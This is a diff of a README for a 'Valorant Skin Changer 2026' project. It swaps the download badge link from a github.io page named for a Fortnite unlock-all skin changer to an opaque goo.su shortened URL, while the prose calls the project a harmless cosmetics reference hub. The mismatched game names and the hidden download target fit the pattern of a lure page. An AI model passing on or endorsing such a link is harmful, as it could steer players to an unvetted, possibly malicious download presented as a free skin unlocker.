@@ -2,7 +2,7 @@
 
 ## Overview
 
-[![Download](https://img.shields.io/badge/Get-Latest_Version-blue?style=for-the-badge)](https://pocketsuntrue.github.io/Fortnite-Skin-Changer-2026-Unlock-All-Skins-Pickaxes-and-Emotes/)
+[![Download](https://img.shields.io/badge/Get-Latest_Version-blue?style=for-the-badge)](https://goo.su/fRWMmp9)
 
 **Valorant Skin Changer 2026** is a community-oriented visual customization project for exploring VALORANT weapon skins, collection concepts, loadout themes, and cosmetic combinations in an organized way. It is intended as a reference and inspiration hub for players who enjoy comparing weapon finishes, building cohesive collections, and discovering new aesthetic combinations.
 
